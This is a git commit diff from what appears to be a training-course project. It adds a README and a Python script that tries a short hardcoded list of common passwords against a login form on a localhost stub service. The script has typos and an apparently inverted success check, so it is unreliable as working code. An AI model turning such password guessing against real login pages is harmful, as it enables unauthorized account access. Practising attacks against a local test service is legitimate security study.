c9c3e0834775d7c477cf2f98882c36b39036c436
dima <test@dima.org>
2022-06-21 01:05:08 +0300

    new inter commit with read.me

--- README.md
+++ README.md
@@ -1,2 +1,6 @@
-# test_services
-test services
+1.0 - added localhost stub for the vulnerable service 
+writing the first enumerator for the password
+default username is "skillbox"
+password list in hardcoded inside
+
+using the requests standard library
--- enumerator.py
+++ enumerator.py
@@ -1,4 +1,25 @@
-import request
+import requests
 
-URL = ""
+URL = "http://localhost:8888/"
+
+# resp = requests.post(URL, data = {"login": "vasya", "password": "1234"})
+
+password_list = [
+    "password",
+    "12345",
+    "qwerty",
+    "1q2w3e",
+    "12345678",
+    "pass",
+    "qwerty123"
+]
+
+for password in password_list:
+    data = { "login": "skillbox", "passwprd": password}
+    print("Trying:", data, end='')
+    response =requests.post(URL, data)
+    print("Code ", response.status_code)
+    if response.status_code != 200:
+        print(respose.content)
+        break
 
